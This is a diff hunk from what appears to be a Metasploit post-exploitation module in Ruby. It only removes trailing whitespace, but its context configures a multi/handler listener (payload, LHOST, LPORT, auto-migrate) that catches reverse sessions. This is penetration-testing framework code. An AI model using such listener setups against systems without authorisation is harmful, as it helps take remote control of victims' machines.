@@ -55,14 +55,14 @@ class Metasploit3 < Msf::Post
 
 		# create a session handler
 		handler = session.framework.exploits.create("multi/handler")
-		handler.register_parent(self)		
+		handler.register_parent(self)
 		handler.datastore['PAYLOAD'] = payload
 		handler.datastore['LHOST']   = lhost
 		handler.datastore['LPORT']   = lport
 		handler.datastore['InitialAutoRunScript'] = "migrate -f"
 		handler.datastore['ExitOnSession'] = true
 		handler.datastore['ListenerTimeout'] = 300
-		handler.datastore['ListenerComm'] = 'local'		
+		handler.datastore['ListenerComm'] = 'local'
 
 		# start the session handler
 
